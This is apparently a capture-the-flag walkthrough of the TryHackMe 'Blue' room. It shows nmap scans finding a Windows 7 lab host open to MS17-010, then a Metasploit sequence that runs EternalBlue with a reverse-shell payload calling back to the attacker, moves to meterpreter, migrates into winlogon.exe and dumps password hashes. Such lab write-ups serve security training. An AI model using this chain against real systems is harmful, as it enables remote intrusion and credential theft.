# [Blue-Tryhackme](https://tryhackme.com/room/blue)

> Nazib Abrar | January 15, 2020

---

## IP

10.10.12.212

## Nmap Scan

```nmap
# Nmap 7.80 scan initiated Sat Jan 15 15:35:38 2022 as: nmap -sC -sV -v -oN nmap.txt 10.10.12.212
Increasing send delay for 10.10.12.212 from 0 to 5 due to 64 out of 213 dropped probes since last increase.
Nmap scan report for 10.10.12.212
Host is up (0.19s latency).
Not shown: 990 closed ports
PORT      STATE    SERVICE            VERSION
135/tcp   open     msrpc              Microsoft Windows RPC
139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3000/tcp  filtered ppp
3389/tcp  open     ssl/ms-wbt-server?
|_ssl-date: 2022-01-15T09:37:09+00:00; 0s from scanner time.
49152/tcp open     msrpc              Microsoft Windows RPC
49153/tcp open     msrpc              Microsoft Windows RPC
49154/tcp open     msrpc              Microsoft Windows RPC
49158/tcp open     msrpc              Microsoft Windows RPC
49159/tcp open     msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h29m59s, deviation: 3h00m00s, median: -1s
| nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:df:fc:15:28:4f (unknown)
| Names:
|   JON-PC<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   JON-PC<20>           Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-01-15T03:37:03-06:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-01-15T09:37:03
|_  start_date: 2022-01-15T09:29:33

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 15 15:38:09 2022 -- 1 IP address (1 host up) scanned in 151.32 seconds
```

```
# Nmap 7.80 scan initiated Sat Jan 15 16:21:49 2022 as: nmap -v --script=smb-vuln-ms17-010 -p 445 -oN nmap_smb.txt 10.10.12.212
Nmap scan report for 10.10.12.212
Host is up (0.22s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jan 15 16:21:51 2022 -- 1 IP address (1 host up) scanned in 2.49 seconds

```

## Metasploit


- `search eternalblue`
- `use 0`
- `show options`
- `set LHOST 10.8.215.27`
- `set RHOSTS 10.10.12.212`
- `set payload windows/x64/shell/reverse_tcp`
- `run` or `exploit`
- `ctrl+z` or `background` to background the shell
- `sessions` shows all the sessions available
- `sessions -i 1` foreground the #1 session and interact with it
- `use shell_to_meterpreter`
- `migrate -N winlogon.exe`
- `hashdump` Dumps all the hashes in the machine
- Windows stores it's password in Windows\System32\config
- `search -f flag*.txt`